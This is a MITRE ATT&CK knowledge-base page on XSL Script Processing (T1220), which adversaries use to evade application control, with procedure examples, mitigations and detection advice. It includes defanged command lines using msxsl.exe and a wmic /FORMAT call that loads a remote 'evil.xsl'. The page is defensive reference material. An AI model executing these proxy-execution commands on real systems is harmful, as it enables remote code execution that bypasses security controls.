MatricesEnterpriseMobileICSTacticsEnterpriseMobileICSTechniquesEnterpriseMobileICSDefensesData SourcesMitigationsEnterpriseMobileICSAssetsCTIGroupsSoftwareCampaignsResourcesGet StartedLearn More about ATT&CKATT&CKconATT&CK Data & ToolsFAQEngage with ATT&CKVersion HistoryLegal & BrandingBenefactorsBlogSearchATT&CKcon 5.0 returns October 22-23, 2024 in McLean, VA.Register heretoday!HomeTechniquesEnterpriseXSL Script ProcessingXSL Script ProcessingAdversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages.[1]Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar toTrusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe)[2]can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.[3]Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.[4]Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.[5]Command-line examples:[3][5]msxsl.exe customers[.]xml script[.]xslmsxsl.exe script[.]xsl script[.]xslmsxsl.exe script[.]jpeg script[.]jpegAnother variation of this technique, dubbed "Squiblytwo", involves usingWindows Management Instrumentationto invoke JScript or VBScript within an XSL file.[6]This technique can also execute local/remote scripts and, similar to itsRegsvr32/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias inWindows Management Instrumentationprovided they utilize the /FORMAT switch.[5]Command-line examples:[5][6]Local File:wmic process list /FORMAT:evil[.]xslRemote File:wmic os get /FORMAT:"https[:]//example[.]com/evil[.]xsl"ID:T1220Sub-techniques:No sub-techniquesⓘTactic:Defense EvasionⓘPlatforms:WindowsⓘSystem Requirements:Microsoft Core XML Services (MSXML) or access to wmic.exeⓘDefense Bypassed:Anti-virus, Application Control, Digital Certificate ValidationContributors:Avneet Singh; Casey Smith; PraetorianVersion:1.2Created:17 October 2018Last Modified:05 May 2022Version PermalinkLive VersionProcedure ExamplesIDNameDescriptionS0373AstarothAstarothexecutes embedded JScript or VBScript in an XSL stylesheet located on a remote domain.[7]G0080Cobalt GroupCobalt Groupused msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.[8]G0126HigaisaHigaisaused an XSL file to run VBScript code.[9]C0022Operation Dream JobDuringOperation Dream Job,Lazarus Groupused a remote XSL script to download a Base64-encoded DLL custom downloader.[10]MitigationsIDMitigationDescriptionM1038Execution PreventionIf msxsl.exe is unnecessary, then block its execution to prevent abuse by adversaries.DetectionIDData SourceData ComponentDetectsDS0011ModuleModule LoadMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process.DS0009ProcessProcess CreationUse process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe.[6][11]Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded. The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.ReferencesWenzel, M. et al. (2017, March 30). XSLT Stylesheet Scripting Using. Retrieved July 3, 2018.Microsoft. (n.d.). Command Line Transformation Utility (msxsl.exe). Retrieved July 3, 2018.netbiosX. (2017, July 6). AppLocker Bypass – MSXSL. Retrieved July 3, 2018.Admin. (2018, March 2). Spear-phishing campaign leveraging on MSXSL. Retrieved July 3, 2018.Singh, A. (2019, March 14). MSXSL.EXE and WMIC.EXE — A Way to Proxy Code Execution. Retrieved August 2, 2019.LOLBAS. (n.d.). Wmic.exe. Retrieved July 31, 2019.Salem, E. (2019, February 13). ASTAROTH MALWARE USES LEGITIMATE OS AND ANTIVIRUS PROCESSES TO STEAL PASSWORDS AND PERSONAL DATA. Retrieved April 17, 2019.Svajcer, V. (2018, July 31). Multiple Cobalt Personality Disorder. Retrieved September 5, 2018.PT ESC Threat Intelligence. (2020, June 4). COVID-19 and New Year greetings: an investigation into the tools and methods used by the Higaisa group. Retrieved March 2, 2021.Breitenbacher, D and Osis, K. (2020, June 17). OPERATION IN(TER)CEPTION: Targeted Attacks Against European Aerospace and Military Companies. Retrieved December 20, 2021.Desimone, J. (2018, April 18). Status Update. Retrieved July 3, 2018.×load more resultsContact UsTerms of UsePrivacy PolicyWebsite Changelog© 2015 - 2024, The MITRE Corporation. MITRE ATT&CK and ATT&CK are registered trademarks of The MITRE Corporation.